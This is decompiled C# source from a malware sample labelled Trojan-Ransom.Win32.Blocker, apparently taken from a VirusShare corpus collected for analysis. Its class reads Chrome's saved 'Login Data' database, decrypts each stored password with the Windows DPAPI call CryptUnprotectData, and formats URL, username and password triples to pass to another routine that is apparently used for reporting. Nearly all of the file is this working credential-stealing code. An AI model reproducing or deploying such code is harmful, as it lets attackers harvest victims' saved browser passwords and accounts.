// Decompiled with JetBrains decompiler
// Type: insomnia.Class37
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace insomnia
{
  internal class Class37
  {
    public static void Method4(string A_0)
    {
      if (A_0 == "" || A_0 == " " || A_0 == null)
        A_0 = "**ALL**";
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
      try
      {
        Class6 class6 = new Class6(str1);
        class6.Method5("logins");
        if (!File.Exists(str1))
          return;
        for (int A_1 = 0; A_1 <= class6.Method4() - 1; ++A_1)
        {
          try
          {
            string str2 = class6.Method2(A_1, "origin_url");
            string str3 = class6.Method2(A_1, "username_value");
            string str4 = Class37.Method1(Encoding.Default.GetBytes(class6.Method2(A_1, "password_value")));
            if (str3 != "" && str4 != "" && str4 != "FAIL" && (str2.Contains(A_0) || A_0 == "**ALL**"))
              Class31.Method3("[CHROME]: " + str2 + " -> " + str3 + " : " + str4, Class26.Field8);
            Thread.Sleep(100);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }

    public static string Method3(string A_0)
    {
      if (A_0 == "" || A_0 == " " || A_0 == null)
        A_0 = "**ALL**";
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
      try
      {
        Class6 class6 = new Class6(str1);
        class6.Method5("logins");
        if (File.Exists(str1))
        {
          for (int A_1 = 0; A_1 <= class6.Method4() - 1; ++A_1)
          {
            try
            {
              string str2 = class6.Method2(A_1, "origin_url");
              string str3 = class6.Method2(A_1, "username_value");
              string str4 = Class37.Method1(Encoding.Default.GetBytes(class6.Method2(A_1, "password_value")));
              if (str3 != "")
              {
                if (str4 != "")
                {
                  if (str4 != "FAIL")
                  {
                    if (!str2.Contains(A_0))
                    {
                      if (!(A_0 == "**ALL**"))
                        continue;
                    }
                    return str3 + ":" + str4;
                  }
                }
              }
            }
            catch
            {
              return "";
            }
          }
        }
      }
      catch
      {
        return "";
      }
      return "";
    }

    [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptUnprotectData(
      ref Class37.Struct9 A_0,
      string A_1,
      ref Class37.Struct9 A_2,
      IntPtr A_3,
      ref Class37.Struct8 A_4,
      int A_5,
      ref Class37.Struct9 A_6);

    private static string Method1(byte[] A_0)
    {
      Class37.Struct9 A_0_1 = new Class37.Struct9();
      Class37.Struct9 A_6 = new Class37.Struct9();
      GCHandle gcHandle = GCHandle.Alloc((object) A_0, GCHandleType.Pinned);
      A_0_1.Field1 = gcHandle.AddrOfPinnedObject();
      A_0_1.Field2 = A_0.Length;
      gcHandle.Free();
      Class37.Struct9 A_2 = new Class37.Struct9();
      Class37.Struct8 A_4 = new Class37.Struct8();
      Class37.CryptUnprotectData(ref A_0_1, (string) null, ref A_2, IntPtr.Zero, ref A_4, 0, ref A_6);
      byte[] numArray = new byte[A_6.Field2 + 1];
      Marshal.Copy(A_6.Field1, numArray, 0, A_6.Field2);
      string str = Encoding.Default.GetString(numArray);
      return str.Substring(0, str.Length - 1);
    }

    [System.Flags]
    private enum Enum7
    {
      Field2 = 1,
      Field1 = 2,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct Struct8
    {
      public int Field4;
      public Class37.Enum7 Field3;
      public IntPtr Field2;
      public string Field1;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct Struct9
    {
      public int Field2;
      public IntPtr Field1;
    }
  }
}
